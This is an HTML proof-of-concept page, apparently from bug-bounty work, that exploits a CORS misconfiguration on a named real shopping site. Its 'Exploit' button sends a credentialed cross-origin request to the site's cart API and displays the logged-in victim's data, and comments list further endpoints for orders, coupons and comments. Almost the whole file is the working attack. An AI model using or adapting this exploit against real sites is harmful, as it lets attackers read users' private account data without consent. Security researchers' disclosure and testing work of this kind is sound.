<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
            function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 
              if (this.readyState == 4 && this.status == 200) {
                  document.getElementById("demo").innerHTML = alert(this.responseText);
			            console.log(this.responseText)
	
                 }
             };
              xhr.open("GET","https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list?opca=", true);
              //https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list?opca=
              //https://www.opposhop.cn/cn/oapi/configs/web/tdk?code=my-order
              //https://www.opposhop.cn/cn/oapi/configs/web/tdk?code=my-coupons
              //https://www.opposhop.cn/cn/oapi/configs/web/tdk?code=my-comments
              xhr.withCredentials = true;
		          xhr.setRequestHeader('Referer', 'https://www.opposhop.cn/');
              xhr.setRequestHeader('Origin', 'https://www.opposhop.cn/');
              xhr.send();

            }




         </script>
     </body>
 </html>
